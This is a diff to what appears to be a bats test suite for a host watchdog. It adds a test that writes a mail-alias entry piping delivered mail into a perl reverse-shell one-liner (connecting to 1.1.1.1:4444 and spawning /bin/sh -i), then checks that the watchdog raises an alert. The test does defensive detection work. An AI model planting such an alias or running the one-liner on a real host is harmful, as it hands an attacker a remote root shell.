@@ -316,3 +316,17 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on aliases pipe surface)" {
+    # Sister to nc / python -c / bash / curl|bash / base64 /
+    # dev-tcp aliases pipe rev-shell variants. Perl on every
+    # Debian/Ubuntu MTA host. Locks perl axis on T1546 MTA mail-
+    # delivery-triggered root-exec persistence — attacker sends
+    # mail to alias pipe-target to fire planted perl rev-shell.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'evil: |perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${ALIASES}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
